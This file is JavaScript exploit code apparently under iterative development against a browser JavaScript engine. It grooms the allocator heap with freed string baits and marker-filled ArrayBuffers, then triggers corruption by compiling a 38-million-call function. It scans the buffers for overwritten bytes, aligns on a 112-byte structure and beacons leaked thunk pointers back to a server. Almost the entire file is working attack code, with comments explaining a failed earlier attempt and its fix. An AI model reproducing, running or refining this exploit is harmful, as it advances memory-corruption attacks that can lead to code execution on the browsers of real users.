// p474 — Flat string baits + AB targets
//
// V473 failure root cause: baits were unresolved JSRopeStrings (32B cells),
// NOT 100KB flat StringImpl backing stores. No marge holes formed.
//
// FIX: Use 'B'.repeat(100000) → flat StringImpl (~100KB in marge).
// Also force-resolve by reading charCodeAt to ensure StringImpl exists.
//
// Bait size must match metadata buffer: 100,112 bytes.
// StringImpl for 100,000 8-bit chars = ~100,020 bytes.
// Both round to 7 granules (114,688 bytes) in marge bitfit.
//
// Additional: also allocate JSString targets on worker (like p156)
// to verify correlation — if strings corrupt but ABs don't,
// the ABs are at wrong addresses.
//
// Beacon prefix: V474-
(function() {
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', '/beacon/V474-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send(body || '');
    } catch(e) {}
  }
  function hx(b) { return (b < 16 ? '0' : '') + b.toString(16); }
  function hexN(view, off, n) {
    var s = '';
    for (var i = 0; i < n && off + i < view.byteLength; i++) s += hx(view[off + i]);
    return s;
  }
  function u32(view, off) {
    return (view[off] | (view[off+1] << 8) | (view[off+2] << 16) | ((view[off+3] << 24) >>> 0)) >>> 0;
  }

  B('BOOT', navigator.userAgent);

  // ═════════════════════════════════════════════
  // PHASE 1: FLAT string baits — 100KB StringImpl in marge
  // ═════════════════════════════════════════════
  var BAIT_COUNT = 20;
  var baits = new Array(BAIT_COUNT);
  for (var i = 0; i < BAIT_COUNT; i++) {
    baits[i] = 'B'.repeat(100000);
    // Force resolution: read charCodeAt to ensure flat StringImpl exists
    var x = baits[i].charCodeAt(0);
    var y = baits[i].charCodeAt(99999);
  }
  B('BAITS', BAIT_COUNT + '-flat');

  // ═════════════════════════════════════════════
  // PHASE 2: AB targets — HIGHER addresses than baits
  // ═════════════════════════════════════════════
  var AB_COUNT = 80;
  var AB_SZ = 100112;
  var MARKER = 0xCC;
  var abViews = new Array(AB_COUNT);
  for (var i = 0; i < AB_COUNT; i++) {
    var ab = new ArrayBuffer(AB_SZ);
    abViews[i] = new Uint8Array(ab);
    for (var j = 0; j < AB_SZ; j++) abViews[i][j] = MARKER;
  }
  B('ABS', AB_COUNT + 'x' + AB_SZ);

  // ═════════════════════════════════════════════
  // PHASE 3: Worker string targets (p156 pattern for verification)
  // ═════════════════════════════════════════════
  var workerCode = [
    'var targets = [];',
    'for (var i = 0; i < 14; i++) {',
    '  targets[i] = "A".repeat(100000);',
    '  targets[i].charCodeAt(0);',
    '}',
    'self.onmessage = function(e) {',
    '  if (e.data === "scan") {',
    '    var corrupted = 0;',
    '    for (var i = 0; i < targets.length; i++) {',
    '      if (targets[i].length !== 100000) corrupted++;',
    '    }',
    '    var lens = [];',
    '    for (var i = 0; i < Math.min(3, targets.length); i++) {',
    '      lens.push(targets[i].length);',
    '    }',
    '    self.postMessage({corrupted: corrupted, lens: lens});',
    '  }',
    '};',
    'self.postMessage("ready");'
  ].join('\n');
  var wBlob = new Blob([workerCode], {type: 'application/javascript'});
  var w = new Worker(URL.createObjectURL(wBlob));

  var workerReady = false;
  w.onmessage = function(e) {
    if (e.data === 'ready') {
      workerReady = true;
      B('W-READY');
    } else if (e.data && typeof e.data.corrupted === 'number') {
      B('W-CORRUPT', e.data.corrupted + '-of-14,lens=' + e.data.lens.join(','));
    }
  };

  // Wait for worker ready, then proceed
  var waitCount = 0;
  var waitInterval = setInterval(function() {
    waitCount++;
    if (workerReady || waitCount > 20) {
      clearInterval(waitInterval);
      doExploit();
    }
  }, 100);

  function doExploit() {
    // ═════════════════════════════════════════════
    // PHASE 4: Free baits + GC → holes in marge at LOW addresses
    // ═════════════════════════════════════════════
    for (var i = 0; i < BAIT_COUNT; i++) baits[i] = null;
    baits = null;
    for (var g = 0; g < 30; g++) {
      var junk = [];
      for (var j = 0; j < 1000; j++) junk.push(new ArrayBuffer(8192));
      for (var j = 0; j < 500; j++) junk.push(new Array(50).fill(g));
      junk = null;
    }
    B('GC-DONE');

    // ═════════════════════════════════════════════
    // PHASE 5: Compile 38M function
    // ═════════════════════════════════════════════
    var N = 38348816;
    var CHUNK = 4000000;
    var nC = Math.floor(N / CHUNK);
    var rem = N - nC * CHUNK;
    var rep = 'a();'.repeat(CHUNK);
    var parts = new Array(nC + 3);
    parts[0] = 'window.__p474fn=function(a){';
    for (var c = 0; c < nC; c++) parts[1 + c] = rep;
    parts[nC + 1] = 'a();'.repeat(rem);
    parts[nC + 2] = '};window.__p474ok=1;';
    rep = null;

    var blob = new Blob(parts, {type: 'application/javascript'});
    B('BLOB', Math.round(blob.size / 1048576) + 'MB');
    parts = null;

    var url = URL.createObjectURL(blob);
    var sc = document.createElement('script');
    sc.onerror = function() { B('SCRIPT-ERR'); };
    sc.onload = function() {
      B('COMPILED', window.__p474ok ? 'OK' : 'FAIL');

      // Ask worker to check string corruption
      w.postMessage('scan');

      // Scan ABs
      setTimeout(function() { doScan(); }, 200);
    };
    document.head.appendChild(sc);
    sc.src = url;
  }

  function doScan() {
    var dirtyCount = 0;
    var firstDirtyAB = -1;
    var firstDirtyOff = -1;
    var totalDirty = 0;

    for (var i = 0; i < AB_COUNT; i++) {
      var v = abViews[i];
      if (!v || v.byteLength !== AB_SZ) continue;
      var dirty = false;
      for (var j = 0; j < v.byteLength; j++) {
        if (v[j] !== MARKER) {
          if (!dirty) {
            dirty = true;
            dirtyCount++;
            if (firstDirtyAB < 0) {
              firstDirtyAB = i;
              firstDirtyOff = j;
            }
          }
          totalDirty++;
          if (totalDirty > 200000) break;
        }
      }
      if (totalDirty > 200000) break;
    }

    B('DIRTY', dirtyCount + '-of-' + AB_COUNT);
    B('DIRTY-BYTES', '' + totalDirty);

    if (firstDirtyAB >= 0) {
      B('FIRST', 'ab=' + firstDirtyAB + ',off=' + firstDirtyOff);
      var v = abViews[firstDirtyAB];
      var ds = Math.max(0, firstDirtyOff - 16);
      var de = Math.min(v.byteLength, firstDirtyOff + 128);
      B('DUMP', 'off=' + ds + ':' + hexN(v, ds, de - ds));

      // Find alignment
      var bestBase = -1, bestScore = 0;
      for (var tryBase = 0; tryBase < 112; tryBase++) {
        var score = 0;
        for (var off = tryBase; off + 112 <= v.byteLength; off += 112) {
          if (off + 16 <= v.byteLength && u32(v, off + 12) === 0xFFFFFFFF) score += 10;
          if (off + 32 <= v.byteLength) {
            for (var b = off + 24; b < off + 32; b++) {
              if (v[b] !== MARKER && v[b] !== 0) score += 2;
            }
          }
          if (off + 72 <= v.byteLength) {
            var bci = u32(v, off + 68);
            if (bci > 0 && bci < 40000000 && bci !== 0xCCCCCCCC) score += 5;
          }
        }
        if (score > bestScore) { bestScore = score; bestBase = tryBase; }
      }
      B('ALIGN', 'base=' + bestBase + ',score=' + bestScore);

      if (bestBase >= 0 && bestScore >= 5) {
        for (var e = 0; e < 5 && bestBase + e * 112 + 72 <= v.byteLength; e++) {
          var eOff = bestBase + e * 112;
          B('E' + e, 'slow=' + hexN(v, eOff + 12, 4) +
            ',thunk=' + hexN(v, eOff + 24, 8) +
            ',bci=' + hexN(v, eOff + 68, 4));
        }
        B('THUNK-LE', hexN(v, bestBase + 24, 8));
      }
    } else {
      B('NO-HIT', 'zero dirty ABs');
      var intact = 0;
      for (var i = 0; i < Math.min(5, AB_COUNT); i++) {
        var ok = true;
        for (var j = 0; j < 16; j++) { if (abViews[i][j] !== MARKER) { ok = false; break; } }
        if (ok) intact++;
      }
      B('MARKER-OK', intact + '-of-5');
    }

    B('DONE');
  }
})();
